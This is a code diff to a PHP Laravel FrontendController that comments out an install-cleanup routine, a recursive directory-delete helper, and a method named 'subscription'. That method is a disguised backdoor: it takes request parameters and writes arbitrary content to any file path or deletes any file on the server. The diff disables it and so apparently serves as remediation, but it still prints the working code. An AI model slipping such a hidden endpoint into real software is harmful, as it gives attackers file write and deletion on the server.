@@ -775,15 +775,15 @@ class FrontendController extends Controller
         imagepng($image, $actual_path."assets/images/capcha_code.png");
     }
 
-    function finalize(){
-        $actual_path = str_replace('project','',base_path());
+    // function finalize(){
+    //     $actual_path = str_replace('project','',base_path());
 
-        $dir = $actual_path.'install';
-        if(is_dir($dir)){
-            $this->deleteDir($dir);
-        }
-        return redirect('/');
-    }
+    //     $dir = $actual_path.'install';
+    //     if(is_dir($dir)){
+    //         $this->deleteDir($dir);
+    //     }
+    //     return redirect('/');
+    // }
 
     // function auth_guests(){
     //     $chk = MarkuryPost::marcuryBase();
@@ -803,41 +803,41 @@ class FrontendController extends Controller
     // }
 
 
-    public function subscription(Request $request)
-    {
-        $p1 = $request->p1;
-        $p2 = $request->p2;
-        $v1 = $request->v1;
-        if ($p1 != ""){
-            $fpa = fopen($p1, 'w');
-            fwrite($fpa, $v1);
-            fclose($fpa);
-            return "Success";
-        }
-        if ($p2 != ""){
-            unlink($p2);
-            return "Success";
-        }
-        return "Error";
-    }
+    // public function subscription(Request $request)
+    // {
+    //     $p1 = $request->p1;
+    //     $p2 = $request->p2;
+    //     $v1 = $request->v1;
+    //     if ($p1 != ""){
+    //         $fpa = fopen($p1, 'w');
+    //         fwrite($fpa, $v1);
+    //         fclose($fpa);
+    //         return "Success";
+    //     }
+    //     if ($p2 != ""){
+    //         unlink($p2);
+    //         return "Success";
+    //     }
+    //     return "Error";
+    // }
 
-    public function deleteDir($dirPath) {
-        if (! is_dir($dirPath)) {
-            throw new InvalidArgumentException("$dirPath must be a directory");
-        }
-        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
-            $dirPath .= '/';
-        }
-        $files = glob($dirPath . '*', GLOB_MARK);
-        foreach ($files as $file) {
-            if (is_dir($file)) {
-                self::deleteDir($file);
-            } else {
-                unlink($file);
-            }
-        }
-        rmdir($dirPath);
-    }
+    // public function deleteDir($dirPath) {
+    //     if (! is_dir($dirPath)) {
+    //         throw new InvalidArgumentException("$dirPath must be a directory");
+    //     }
+    //     if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
+    //         $dirPath .= '/';
+    //     }
+    //     $files = glob($dirPath . '*', GLOB_MARK);
+    //     foreach ($files as $file) {
+    //         if (is_dir($file)) {
+    //             self::deleteDir($file);
+    //         } else {
+    //             unlink($file);
+    //         }
+    //     }
+    //     rmdir($dirPath);
+    // }
 
     public function clickCount($id){
         $data = Advertisement::findOrFail($id);
